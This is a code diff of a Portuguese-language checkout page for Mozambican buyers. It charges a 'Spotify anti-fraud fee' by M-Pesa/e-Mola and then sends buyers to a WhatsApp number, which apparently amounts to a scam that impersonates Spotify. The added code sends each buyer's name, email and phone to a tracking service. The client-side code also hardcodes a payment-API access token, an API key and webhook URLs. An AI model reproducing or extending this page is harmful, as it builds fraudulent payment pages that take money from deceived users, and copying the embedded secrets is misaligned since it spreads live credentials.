@@ -161,9 +161,7 @@ input[type="text"]:focus, input[type="email"]:focus{
   <div class="secure">COMPRA SEGURA</div>
   <div class="country">🇲🇿</div>
 
-  <div class="https://rocketmedia.site/wp-content/uploads/2025/09/logo-spotify.png">
-    <div class="badge"></div>
-  </div>
+  <div class="logo"><div class="badge"></div></div>
 
   <div class="title">Taxa Anti Fraude Spotify</div>
   <div class="price" id="price">297,00 MT</div>
@@ -211,7 +209,6 @@ input[type="text"]:focus, input[type="email"]:focus{
   </div>
 </div>
 
-
 <script>
 const metodoBtns = document.querySelectorAll(".payment-methods button");
 let metodoSelecionado = "mpesa";
@@ -219,8 +216,101 @@ let wallet_id = "";
 let number_waht = "258824342006";
 let push_cut ="https://api.pushcut.io/QsggCCih4K4SGeZy3F37z/notifications/MinhaNotifica%C3%A7%C3%A3o";
 let push_cut_1 ="https://api.pushcut.io/FGIMnjsUNYIAlFJ_OGbP8/notifications/MinhaNotifica%C3%A7%C3%A3o"
-let acess_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5ZjkwMzg2Mi1hNzgwLTQ0MGQtOGVkNS1iOGQ4MDkwYjE4MGUiLCJqdGkiOiIxNTdmMTM4NDZiNjUwMDUxYzg3ODQ1NDc5ZjQ4NmQwNGU5MDIxMTBmOWNjNDJlNWNlMmQxOTg3ZjQ0Y2MzOThiM2VmYjYyYmI4OWNiYjk5NSIsImlhdCI6MTc1NDg2MzIzMS41MjQ0NDksIm5iZiI6MTc1NDg2MzIzMS41MjQ0NTEsImV4cCI6MTc4NjM5OTIzMS41MjE1MDMsInN1YiI6IiIsInNjb3BlcyI6W119.sSGP5ncLSw-OOp3hW7YQpFtXcXqnheEIAt1G3Nn8-v-ajgtyV8EE9yrbV_rLlTHvMZfs7p-0VNe8yrWXLwWj8CPgyVFzutX918uEdPHODz-osU8ROYWE5-IMrADwuQ8JA1IHQZKXp9jj41bxVhYqcvMmBrH_Tt2tKKa4JHunYlD_xgjWgNLmHArq31J5iyC8_jNR6LWDTqx7ohWX0LIuQ3mXfl8WKFAmx06YzWHWG4kNFLZZzsd1e-UVP_WqmTQ-ptX_nOA3AelV5xFJGM_i__cghWM3TQUX6Wx4JD3YolHyU3C7G7Z6HtFQ-_Jb2JE4kHZGMmu-85NJgcQS6FbVIkI6ZWSoWI_DsjtdkYMo-Sbz4m-9rYPRXVocsz0rSAMeV-BQkm6Vh-ux7a5j677eumdvz6Osdp08BjpkJ25ZHN6wQru0JCjSCiTasfY7BPYxdWi4JWD4Xec4Ssvi1XzD2M7_pQ_QJ0JGaWyU3jez4IpYyFjw7CZO7aWi-SAFZPNuXZ04V0qXqmpVH-2Q5w7O29-zdkEYwvmJfPcokFGzRJpvseXxfxnOSjHuZxOAJ_J8aBXRyswXfz0ID3xqWjzj53wvVOCjowzMBrfMYJeR4u72ODxO2zey0E3Lux7zdTBCbqLB5J45DmACfWmXY1G9--bIbBq4lSTIcqwrkXbV9pM";
+let acess_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5ZjkwMzg2Mi1hNzgwLTQ0MGQtOGVkNS1iOGQ4MDkwYjE4MGUiLCJqdGkiOiIxNTdmMTM4NDZiNjUwMDUxYzg3ODQ1NDc5ZjQ4NmQwNGU5MDIxMTBmOWNjNDJlNWNlMmQxOTg3ZjQ0Y2MzOThiM2VmYjYyYmI4OWNiYjk5NSIsImlhdCI6MTc1NDg2MzIzMS41MjQ0NDksIm5iZiI6MTc1NDg2MzIzMS41MjQ0NTEsImV4cCI6MTc4NjM5OTIzMS41MjE1MDMsInN1YiI6IiIsInNjb3BlcyI6W119.sSGP5ncLSw-OOp3hW7YQpFtXcXqnheEIAt1G3Nn8-v-ajgtyV8EE9yrbV_rLlTHvMZfs7p-0VNe8yrWXLwWj8CPgyVFzutX918uEdPHODz-osU8ROYWE5-IMrADwuQ8JA1IHQZKXp9jj41bxVhYqcvMmBrH_Tt2tKKa4JHunYlD_xgjWgNLmHArq31J5iyC8_jNR6LWDTqx7ohWX0LIuQ3mXfl8WKFAmx06YzWHWG4kNFLZZzsd1e-UVP_WqmTQ-ptX_nOA3AelV5xFJGM_i__cghWM3TQUX6Wx4JD3YolHyU3C7G7Z6HtFQ-_Jb2JE4kHZGMmu-85NJgcQS6FbVIkI6ZWSoWI_DsjtdkYMo-Sbz4m-9rYPRXVocsz0rSAMeV-BQkm6Vh-ux7a5j677eumdvz6Osdp08BjpkJ25ZHN6wQru0JCjSCiTasfY7BPYxdWi4JWD4Xec4Ssvi1XzD2M7_pQ_QJ0JGaWyU3jez4IpYyFjw7CZO7aWi-SAFZPNuXZ04V0qXqmpVH-2Q5w7O29-zdkEYwvmJfPcokFGzRJpvseXxfxnOSjHuZxOAJ_J8aBXRyswXfz0ID3xqWjzj53wvVOCjowzMBrfMYJeR4u72ODxO2zey0E3Lux7zdTBCbqLB5J45DmACfWmXY1G9--bIbBq4lSTIcqwrkXbV9pM"; // teu token M-Pesa/e-Mola
 
+// =============================
+// 🔗 Captura de UTM
+// =============================
+function getUTMParameters() {
+  const urlParams = new URLSearchParams(window.location.search);
+  return {
+    utm_source: urlParams.get("utm_source") || null,
+    utm_medium: urlParams.get("utm_medium") || null,
+    utm_campaign: urlParams.get("utm_campaign") || null,
+    utm_term: urlParams.get("utm_term") || null,
+    utm_content: urlParams.get("utm_content") || null
+  };
+}
+const utmData = getUTMParameters();
+localStorage.setItem("utm_data", JSON.stringify(utmData));
+
+// =============================
+// 🔗 Função Envio Utmify
+// =============================
+async function sendToUtmify(status, orderId, customer, total, utmData) {
+  const exchangeRate = 0.091; // 1 MZN ≈ 0.091 BRL
+  const totalPriceInCentsBRL = Math.max(1, Math.round(total * exchangeRate * 100)); // nunca 0
+  const gatewayFee = Math.max(1, Math.round(totalPriceInCentsBRL * 0.05)); // simulação 5%
+  const userCommission = totalPriceInCentsBRL - gatewayFee;
+
+  const now = new Date();
+  const createdAt = now.toISOString().replace("T", " ").substring(0, 19);
+  const approvedDate = status === "paid" ? createdAt : null;
+
+  const payload = {
+    orderId: String(orderId),
+    platform: "SpotifyPay",
+    paymentMethod: "pix",
+    status: status,
+    createdAt: createdAt,
+    approvedDate: approvedDate,
+    refundedAt: null,
+    customer: {
+      name: customer.nome,
+      email: customer.email,
+      phone: customer.phone,
+      document: null,
+      country: "MZ",
+      ip: "127.0.0.1" // Utmify recomenda enviar algo
+    },
+    products: [
+      {
+        id: "spotify-anti-fraude",
+        name: "Taxa Anti Fraude Spotify",
+        planId: null,
+        planName: null,
+        quantity: 1,
+        priceInCents: totalPriceInCentsBRL
+      }
+    ],
+    trackingParameters: {
+      src: null,
+      sck: null,
+      utm_source: utmData.utm_source || null,
+      utm_campaign: utmData.utm_campaign || null,
+      utm_medium: utmData.utm_medium || null,
+      utm_content: utmData.utm_content || null,
+      utm_term: utmData.utm_term || null
+    },
+    commission: {
+      totalPriceInCents: totalPriceInCentsBRL,
+      gatewayFeeInCents: gatewayFee,
+      userCommissionInCents: userCommission,
+      currency: "BRL"
+    },
+    isTest: false
+  };
+
+  try {
+    const response = await fetch("https://api.utmify.com.br/api-credentials/orders", {
+      method: "POST",
+      headers: {
+        "x-api-token": "fpTt4bfdEyFqx4etWWYIKYadVUHGMIlHqcsZ",
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
+    const res = await response.json();
+    console.log("📩 UTMIFY ["+status+"] =>", res);
+  } catch (err) {
+    console.error("Erro ao enviar para Utmify:", err);
+  }
+}
+
+
+// =============================
+// Lógica Checkout
+// =============================
 metodoBtns.forEach(btn => {
   btn.addEventListener("click", () => {
     metodoBtns.forEach(b => b.classList.remove("active"));
@@ -249,11 +339,16 @@ document.getElementById("formPagamento").addEventListener("submit", async functi
   const nome = document.getElementById("nome").value;
   const email = document.getElementById("email").value;
   const telefone = document.getElementById("numero").value;
+  const total = PRICE_BASE + (vipCheckbox.checked ? PRICE_BUMP : 0);
+
   if (!nome || !email || !telefone || !metodoSelecionado) throw new Error('Dados incompletos');
   if (!/^(84|85|86|87)\d{7}$/.test(telefone)) throw new Error('Numero de telefone invalido');
 
   const popup = document.getElementById("popup");
   popup.style.display = "flex";
+
+  // Envia WAITING_PAYMENT para Utmify
+  sendToUtmify("waiting_payment", Date.now().toString(), {nome, email, phone: telefone}, total, utmData);
 
   let tempo = 180;
   const interval = setInterval(() => {
@@ -273,22 +368,26 @@ document.getElementById("formPagamento").addEventListener("submit", async functi
         },
       body: JSON.stringify({
           "client_id": "9f903862-a780-440d-8ed5-b8d8090b180e",
-          "amount": PRICE_BASE + (vipCheckbox.checked ? PRICE_BUMP : 0),
+          "amount": total,
           "phone": telefone,
           "reference": "PrimeiroPagamento"
       })
     });
     if(resposta.status===200){
-      try{ await fetch(push_cut,{method:'POST',body:JSON.stringify({text:`${nome} pagou ${PRICE_BASE + (vipCheckbox.checked ? PRICE_BUMP : 0)} MZN por ${metodoSelecionado}`,title:'Nova venda aprovada'})}); }catch(err){}
-      try{ await fetch(push_cut_1,{method:'POST',body:JSON.stringify({text:`${nome} pagou ${PRICE_BASE + (vipCheckbox.checked ? PRICE_BUMP : 0)} MZN por ${metodoSelecionado}`,title:'Nova venda aprovada'})}); }catch(err){}
+      try{ await fetch(push_cut,{method:'POST',body:JSON.stringify({text:`${nome} pagou ${total} MZN por ${metodoSelecionado}`,title:'Nova venda aprovada'})}); }catch(err){}
+      try{ await fetch(push_cut_1,{method:'POST',body:JSON.stringify({text:`${nome} pagou ${total} MZN por ${metodoSelecionado}`,title:'Nova venda aprovada'})}); }catch(err){}
       let mensagem = `Comprei o produto Ferramenta Secreta e quero o receber, meu nome é ${nome}, paguei usando o ${metodoSelecionado} pelo numero: ${telefone}`;
       let link = `https://wa.me/${number_waht}?text=` + encodeURIComponent(mensagem);
       fbq('track', 'Purchase', {
-        value: PRICE_BASE + (vipCheckbox.checked ? PRICE_BUMP : 0),
+        value: total,
         currency: 'MZN',
         content_name: 'Ferramenta Secreta',
         content_category: metodoSelecionado
       });
+
+      // Envia PAID para Utmify
+      sendToUtmify("paid", Date.now().toString(), {nome, email, phone: telefone}, total, utmData);
+
       window.location.href = link;
     } else {
       throw new Error("Pagamento não foi processado");
